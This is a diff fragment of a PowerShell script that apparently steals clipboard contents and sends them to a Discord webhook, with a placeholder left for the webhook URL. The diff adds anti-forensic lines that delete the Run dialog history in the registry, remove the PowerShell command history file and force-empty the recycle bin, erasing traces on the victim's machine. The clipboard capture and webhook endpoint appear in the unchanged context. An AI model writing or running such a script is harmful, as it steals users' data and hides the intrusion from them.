@@ -1,3 +1,7 @@
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+
 $prev_clip = Get-Clipboard -Raw
 
 $dc = "your discord webhook here"
